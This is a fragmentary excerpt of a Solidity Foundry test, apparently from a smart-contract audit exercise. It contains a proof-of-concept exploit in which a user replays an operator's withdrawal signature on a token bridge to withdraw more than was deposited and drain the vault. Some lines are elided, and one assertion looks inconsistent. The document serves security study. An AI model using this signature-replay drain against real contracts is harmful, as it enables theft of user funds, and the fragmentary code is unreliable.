...
contract L1BossBridgeTest is Test {
    ...
    function setUp() public {
        ...
        token.transfer(address(victim), 1000e18);
...
///////////////////////////
    ...
    function test____EXPLOIT____UserCan_RECALL_WithdrawTokensWithOperatorSignature() public {
        uint256 depositAmount = 10e18;

        vm.startPrank(victim); /// victim setup
        uint256 victimInitialBalance = token.balanceOf(address(victim));
        token.approve(address(tokenBridge), depositAmount);
        ...
        uint256 userInitialBalance = token.balanceOf(address(user));
        token.approve(address(tokenBridge), depositAmount + depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
        ...
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);
        assertEq(token.balanceOf(address(victim)), userInitialBalance - depositAmount);
        ...
        (uint8 va, bytes32 ra, bytes32 sa) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        tokenBridge.withdrawTokensToL1(user, depositAmount, va, ra, sa);
        ///  user Withdraw more then he deposited - which can drain the contract
        assertEq(token.balanceOf(address(user)), userInitialBalance + depositAmount);
        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(address(victim)), victimInitialBalance - depositAmount);
